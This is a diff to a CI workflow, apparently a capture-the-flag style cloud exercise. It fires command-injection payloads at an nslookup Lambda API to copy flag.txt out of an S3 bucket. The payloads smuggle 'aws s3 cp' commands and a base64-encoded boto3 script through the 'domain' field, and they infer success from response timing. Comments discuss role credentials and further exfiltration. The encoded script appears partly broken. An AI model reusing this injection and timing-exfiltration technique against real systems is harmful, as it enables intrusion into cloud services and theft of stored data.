@@ -85,15 +85,13 @@ jobs:
           curl -s -o /dev/null -w "HTTP %{http_code}\n" https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/debug.txt
           curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/debug.txt
 
-      - name: Exploit - read flag using lambdaRole native creds + timing exfil
+      - name: Diagnostic - test if lambdaRole can read ANY object from codec bucket
         run: |
-          echo "Fix: Previous injections OVERRODE lambdaRole creds with cicdRole creds."
-          echo "lambdaRole is in bucket policy (with VPC condition), cicdRole is NOT."
-          echo "Now: Use lambdaRole's NATIVE credentials (don't inject cicdRole)."
-          INJECT="x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && sleep 15 && cat /tmp/flag.txt | wc -c || sleep 1 #"
+          echo "Previous: flag.txt read failed with ~1s timing."
+          echo "Test: Can lambdaRole read code.zip instead?"
+          INJECT="x; aws s3 cp s3://codec4f26c862a321ef5/code.zip /tmp/code.zip && sleep 15 || sleep 1 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
 
-          echo "--- Sending lambda-native-creds exfil payload ---"
           START=$(date +%s%N)
           curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
             -H "Content-Type: application/json" \
@@ -101,12 +99,33 @@ jobs:
           END=$(date +%s%N)
           ELAPSED_MS=$(( (END - START) / 1000000 ))
 
-          echo "Response time: ${ELAPSED_MS}ms"
+          echo "Response time for code.zip: ${ELAPSED_MS}ms"
           if [ $ELAPSED_MS -gt 10000 ]; then
-            echo "SUCCESS: took >10s, flag copy succeeded! Flag is in /tmp/flag.txt on Lambda."
-            echo "Next step: exfil /tmp/flag.txt content via another channel."
+            echo "SUCCESS: lambdaRole can read from codec bucket!"
+            echo "Issue is specific to flag.txt (maybe different perms or encryption?)"
           else
-            echo "FAILED: took ~1s, flag copy failed (still permission issue or wrong VPC)"
+            echo "FAILED: lambdaRole can't read ANY object. VPC condition or bucket policy broken."
+          fi
+
+      - name: Last resort - extract flag via Python boto3 in Lambda
+        run: |
+          echo "Trying direct boto3 API (not AWS CLI subprocess)..."
+          B64="aW1wb3J0IGJvdG8zCmltcG9ydCBvc20KcyA9IGJvdG8zLmNsaWVudCgnczMnKQp0cnk6CiAgICByID0gcy5nZXRfb2JqZWN0KEJ1Y2tldD0nY29kZWM0ZjI2Yzg2MmEzMjFlZjUnLCBLZXk9J2ZsYWcudHh0JykKICAgIGZsYWcgPSByWydCb2R5J10ucmVhZCgpCiAgICBvcwpzeXMuZXhpdCgwKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBvcwpzeXMuZXhpdCgxKQ=="
+          INJECT="x; echo $B64 | base64 -d | python3 && sleep 15 || sleep 1 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d @payload.json
+          END=$(date +%s%N)
+          ELAPSED_MS=$(( (END - START) / 1000000 ))
+
+          echo "Response time for boto3: ${ELAPSED_MS}ms"
+          if [ $ELAPSED_MS -gt 10000 ]; then
+            echo "Flag successfully read via boto3"
+          else
+            echo "boto3 also failed"
           fi
 
       - name: Read Lambda CloudWatch logs for RCE diagnostics
